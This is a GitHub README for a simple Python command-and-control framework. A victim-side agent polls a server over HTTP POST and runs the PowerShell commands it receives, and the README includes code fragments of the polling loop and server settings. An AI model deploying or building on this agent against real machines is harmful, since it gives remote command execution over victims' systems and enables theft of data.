# pyc2-c2overPOSTresponse

This project is still under development. This is a simple C2 framework that allows you to run Powershell commands in HTTP responses. 

It works as follows: 
- Run server.py to start a http server
- Run agent.py to send a POST request
- The server sesponds to the request with a powershell command that is ran by agent.py
- agent.py sends another POST request after the specified time with the command response
- I am working on a mechanism to allow the attacker to send a different response but for now it's a loop

The framework also alows the attacker to upload a file to the victim by sending a powershell command that would sends a HTTP GET request to the server. 

## Installation

Download the .py files and run them. 
Agent.py goes to the victim and Server.py is for you : ) 

## Usage

### Configure Agent.py

Agent.py needs to be installed and ran on the victim machine. Provide the C2 url as shown below.

```
    url = "http://localhost:8080"  # Replace your C2 URL

```

The http requests are sent in time intervals. You can set this in Agent.py as well. 

```
output = 'No command Ran'
    while True:
        command_to_run = http_sender(output)
        if command_to_run:
            output = run_powershell_command(command_to_run) 
        # Sleep for a specified ammount of time (10 seconds) before sending the next request   
        time.sleep(10)  
        count =+ 1
```

Each HTTP POST request will require you to enter a desired command from the server side that will be sent in the HTTP response message body

### Configure Server.py

Configure the host and port you wish to run the C2 server on 

```
host = "localhost"
port = 8080
```
Specify where you want to save the command output logs

```
        # Append the message body to a text file
        with open('received_messages.txt', 'a') as file:
            file.write(message_body + '\n')
```

Specify the directory of the file you would like to upload using HTTP GET

```
       def do_GET(self):
        # Define the directory where your files are located
        file_directory = "File Path"
```

## Summarized UML Sequence Diagram 

<img width="465" alt="image" src="https://github.com/dewardvide/pyc2-c2overPOSTresponse/assets/91884298/ff5801a8-8a8f-4f92-af0e-44bffb69c7f5">

## Contributing

Pull requests are welcome. For major changes, please open an issue first
to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License

[MIT](https://choosealicense.com/licenses/mit/)
